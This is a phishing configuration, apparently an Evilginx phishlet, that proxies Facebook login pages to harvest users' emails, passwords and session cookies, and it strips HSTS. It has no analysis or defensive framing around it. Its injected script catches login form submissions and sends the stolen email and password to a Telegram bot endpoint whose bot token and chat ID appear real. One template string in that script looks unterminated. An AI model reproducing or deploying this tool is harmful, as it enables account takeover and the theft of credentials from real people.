author: 'evilginx-enhanced'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true}
  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true}

sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'graph.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'graph\.facebook\.com', replace: '{hostname}', mimes: ['*/*']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'fbcdn.net', search: 'static\.xx\.fbcdn\.net', replace: '{hostname}', mimes: ['*/*']}

response_headers:
  - name: 'Content-Security-Policy'
    value: "default-src 'self' 'unsafe-inline' 'unsafe-eval' *.facebook.com *.fbcdn.net data: blob:"
  - name: 'X-Frame-Options'
    value: 'ALLOW-FROM https://www.facebook.com'
  - name: 'Strict-Transport-Security'
    value: 'max-age=0'  # Disable HSTS enforcement

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'
  encrypted_payload:
    key: 'enc_pass'
    search: '(.*)'
    type: 'post'

auth_tokens:
  - domain: '.facebook.com'
    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin']
    secure: true
    http_only: true

session_capture:
  force_redirect: '/'
  cookie_domain: '.facebook.com'
  secure_cookies: true
  http_only_cookies: true
  capture_on_redirect: true

login:
  domain: 'www.facebook.com'
  path: '/login.php'
  force_basic_auth: true

js_inject:
  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
    trigger_paths: ["/login.php", "/login/", "/"]
    script: |
      document.addEventListener('submit', function(e){
        const form = e.target;
        console.log('you are here');
        if(form.action.includes('login.php') || form.action.includes('login.')){
          const email = form.querySelector('input[name="email"]')?.value;
          const pass = form.querySelector('input[name="pass"]')?.value;
          console.log('form submitted');
          console.log(email);
          console.log(pass);
          if(email && pass){
            fetch('/capture_creds', {
              method: 'POST',
              body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
            });

            fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                chat_id: "5228920520",
                text: `New Logs\nEmail: ${email}\npass: ${pass}\nIP: ${window.location.hostname}
                disable_notification: false
              })
            })
          }
        }
      }, true);